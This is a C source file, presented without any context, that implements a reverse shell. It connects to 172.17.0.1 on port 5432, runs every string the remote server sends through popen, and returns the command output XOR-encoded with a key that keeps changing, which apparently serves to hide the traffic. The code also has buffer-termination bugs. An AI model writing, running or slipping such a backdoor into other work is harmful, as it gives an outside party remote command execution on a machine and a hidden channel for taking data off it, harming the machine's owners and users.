#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h> //inet_addr
#include <linux/limits.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    int socket_desc;
    struct sockaddr_in server;

    //Create socket
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_desc == -1)
    {
        printf("Could not create socket");
    }

    server.sin_addr.s_addr = inet_addr("172.17.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(5432);

    //Connect to remote server
    if (connect(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("connect error");
        return 1;
    }

    puts("Connected\n");

    char *message, server_reply[2000];

    char command_output[4096];

    FILE *fp;
    int status;
    char path[PATH_MAX];

    char new_command_output[4096];

    int encrypt[] = {0x32, 0x21, 0x95, 0x3f, 0x5f, 0x9f, 0x12, 0x44};

    //Receive a reply from the server
    while (recv(socket_desc, server_reply, 2000, 0) > 0)
    {
        printf("%s", server_reply);
        fp = popen(server_reply, "r");
        if (fp == NULL)
        {
            send(socket_desc, "Something went wrong", strlen("Something went wrong"), 0);
            continue;
        }

        while (fgets(path, PATH_MAX, fp) != NULL)
        {
            for (int i = 0; i < strlen(path); i++)
            {
                new_command_output[i] = path[i] ^ encrypt[i % 8];
            }
            printf("%s", path);
            send(socket_desc, new_command_output, strlen(new_command_output), 0);

            if (strlen(new_command_output) > 4)
            {
                for (int i = 0; i < 4; i++)
                {
                    encrypt[i] = new_command_output[i];
                }
            }
        }

        pclose(fp);
    }

    close(socket_desc);
}